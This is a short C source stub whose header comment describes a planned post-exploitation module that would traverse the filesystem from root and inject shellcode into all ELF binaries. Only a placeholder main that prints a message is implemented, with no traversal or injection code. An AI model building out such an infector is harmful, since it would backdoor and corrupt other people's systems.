/*

Author : Abhinav Thakur
Email  : compilepeace@gmail.com


Warning : You may not want to run the compiled binary on your host machine as it may lead to 
		  corruption or backdooring of all utility programs provided by the distribution and
		  eventually leave your system in an unstable/unusable state.


Description : This program is a Post-Exploitation module which crawls the filesystem starting from
			  the root node '/' finding all the ELF binaries on the system and injecting shellcode
			  in the writable sections of the ELFs.							
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>


#define ROOTNODE "/"


int main()
{
	
	// perform directory traversal starting from the ROOTNODE
	printf("Let's Start\n");
	
return 0x00;
}
